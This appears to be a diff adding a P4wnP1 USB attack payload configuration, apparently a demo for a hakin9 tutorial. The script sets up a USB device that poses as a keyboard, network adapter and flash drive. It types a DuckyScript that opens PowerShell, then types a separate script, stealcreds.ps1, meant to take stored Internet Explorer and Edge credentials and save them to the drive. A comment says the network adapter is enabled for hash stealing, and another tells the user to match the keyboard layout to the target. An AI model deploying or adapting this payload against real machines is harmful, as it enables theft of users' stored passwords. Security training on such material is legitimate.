@@ -1,0 +1,45 @@
+# P4wnP1 demo payload by MaMe82
+# ==========================
+#
+# Steals stored plain credentials of Internet Explorer / Microsoft Edge 
+# and stores them on the built-in flash drive
+#
+# - shows how to deploy a custom drive label to the USB flash drive
+# - shows how to access the flash drive from powershell
+# - shows how to output a DuckyScript from a dedicated file
+# - shows how a multifile payload could be structured in a dedicated sub directory
+#
+# Note: RNDIS is enabled, but not needed. This is to keep network access
+#       while following the tutorial, on payload development writen for hakin9
+
+# assign custom drivelabel to UMS
+UMSLABEL="HAKIN9"
+fatlabel $wdir/USB_STORAGE/image.bin $UMSLABEL
+
+# =============================
+# USB setup
+# =============================
+USB_VID="0x1d6b"    # Vendor ID
+USB_PID="0x1002"    # Product ID
+USE_ECM=false       # we need no Linux/Mac networking
+USE_RNDIS=true      # RNDIS network device to enable hash stealing
+USE_HID=true        # HID keyboard to allow entering cracked password
+USE_UMS=true # enable USB Mass Storage
+
+# Keyboard language for outhid and duckhid commands
+# possible languages: "be", "br", "ca", "ch", "de", "dk", "es", "fi",
+# 	"fr", "gb", "hr", "it", "no", "pt", "ru", "si", "sv", "tr", "us"
+lang="de" # MAKE THE KEYBOARD LANGUAGE MATCH THE TARGET
+
+function onKeyboardUp()
+{
+	# execute DuckyScript responsible for bringing up PowerShell
+	cat $wdir/payloads/hakin9/startps.duck | duckhid
+	
+	# print out the PowerShell script as raw ASCII
+	# Important: The script has to end with an empty line, to force pressing
+	# RETURN after the last line
+	cat $wdir/payloads/hakin9/stealcreds.ps1 | outhid
+}
+
+
